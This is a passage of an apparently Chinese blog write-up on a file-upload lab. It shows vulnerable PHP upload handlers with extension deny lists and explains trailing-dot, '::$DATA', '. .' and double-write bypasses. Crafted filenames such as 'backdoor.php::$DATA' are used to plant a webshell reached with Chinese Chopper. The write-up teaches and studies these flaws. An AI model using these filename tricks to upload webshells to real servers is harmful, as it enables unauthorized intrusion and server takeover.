class=&#34;string&#34;&gt;&amp;quot;.jSpx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSw&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSv&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jHtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.ascx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.ashx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asmx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.cer&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSpx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aScx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aShx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSmx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.cEr&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.sWf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.swf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.htaccess&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;trim&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;strrchr&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;strtolower&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//转换为小写&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;str_ireplace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;::$DATA&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//去除字符串::$DATA&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;trim&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//首尾去空&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;title function_ invoke__&#34;&gt;in_array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;move_uploaded_file&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;上传出错！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;此文件类型不允许上传！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = UPLOAD_PATH . &lt;span class=&#34;string&#34;&gt;&amp;#x27;文件夹不存在,请手工创建！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;发现并没对后缀名的最后一个.进行deldot()，因此存在后缀加点绕过漏洞。&lt;/p&gt;
&lt;p&gt;抓包，修改上传文件名，加个点：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;filename=&lt;span class=&#34;string&#34;&gt;&amp;quot;backdoor.php.&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003172734314.png&#34; alt=&#34;image-20221003172734314&#34;&gt;&lt;/p&gt;
&lt;p&gt;菜刀连接对应文件即可。&lt;/p&gt;
&lt;h2 id=&#34;后缀加-DATA绕过&#34;&gt;&lt;a href=&#34;#后缀加-DATA绕过&#34; class=&#34;headerlink&#34; title=&#34;后缀加::$DATA绕过&#34;&gt;&lt;/a&gt;后缀加::$DATA绕过&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;image-20221003173227712.png&#34; alt=&#34;image-20221003173227712&#34;&gt;&lt;br&gt;抓包，修改文件名：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;filename=&lt;span class=&#34;string&#34;&gt;&amp;quot;backdoor.php::&lt;span class=&#34;subst&#34;&gt;$DATA&lt;/span&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003174926600.png&#34; alt=&#34;image-20221003174926600&#34;&gt;&lt;/p&gt;
&lt;p&gt;在上传后由于文件流的特性::$DATA会自动去除，而最终上传的是php文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003175017386.png&#34; alt=&#34;image-20221003175017386&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;后缀加点-空格-点绕过&#34;&gt;&lt;a href=&#34;#后缀加点-空格-点绕过&#34; class=&#34;headerlink&#34; title=&#34;后缀加点+空格+点绕过&#34;&gt;&lt;/a&gt;后缀加点+空格+点绕过&lt;/h2&gt;&lt;p&gt;后缀+&lt;code&gt;. .&lt;/code&gt;来进行绕过&lt;/p&gt;
&lt;p&gt;来看看源码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;file_exists&lt;/span&gt;(UPLOAD_PATH)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;.php&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php5&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php3&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php2&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.htm&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.phtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pht&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp5&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp3&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp2&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.Html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.Htm&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsw&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsv&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSw&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSv&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jHtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.ascx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.ashx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asmx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.cer&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSpx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aScx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aShx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSmx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.cEr&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.sWf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.swf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.htaccess&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;trim&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;deldot&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//删除文件名末尾的点&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;strrchr&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;strtolower&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//转换为小写&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;str_ireplace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;::$DATA&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//去除字符串::$DATA&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;trim&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//首尾去空&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;title function_ invoke__&#34;&gt;in_array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;move_uploaded_file&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;上传出错！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;此文件类型不允许上传！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = UPLOAD_PATH . &lt;span class=&#34;string&#34;&gt;&amp;#x27;文件夹不存在,请手工创建！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中过滤了很多，但是如果当后缀名为&lt;code&gt;. .&lt;/code&gt;时，文件名末尾的点只去除了一次，首尾去空以后还剩下一个点&lt;/p&gt;
&lt;p&gt;由于此时已经走完了代码的过滤流程，则可以实现上传php文件获得webshell&lt;/p&gt;
&lt;p&gt;抓包，修改&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;filename=&amp;quot;backdoor.php. .&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003175926184.png&#34; alt=&#34;image-20221003175926184&#34;&gt;&lt;/p&gt;
&lt;p&gt;即可上传成功。&lt;/p&gt;
&lt;h2 id=&#34;后缀双写绕过&#34;&gt;&lt;a href=&#34;#后缀双写绕过&#34; class=&#34;headerlink&#34; title=&#34;后缀双写绕过&#34;&gt;&lt;/a&gt;后缀双写绕过&lt;/h2&gt;&lt;p&gt;查看源码:&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;file_exists&lt;/span&gt;(UPLOAD_PATH)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;php&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;php5&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;php4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;php3&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;php2&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;htm&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;phtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;pht&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jsp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jspa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jsw&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jsv&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jspf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;jtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;asp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;aspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;asa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;asax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;ascx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;ashx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;asmx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;cer&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;swf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;htaccess&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;trim&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;str_ireplace&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span 